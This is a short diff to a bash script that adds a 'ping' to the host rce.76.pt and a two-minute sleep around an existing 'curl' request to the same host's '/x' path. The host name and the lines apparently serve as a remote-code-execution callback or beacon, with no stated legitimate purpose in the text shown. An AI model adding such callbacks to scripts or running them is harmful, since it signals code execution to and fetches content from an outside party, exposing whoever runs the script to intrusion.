@@ -1,2 +1,4 @@
 #!/usr/bin/env bash
+ping -c 1 rce.76.pt
 curl https://rce.76.pt/x
+sleep 120
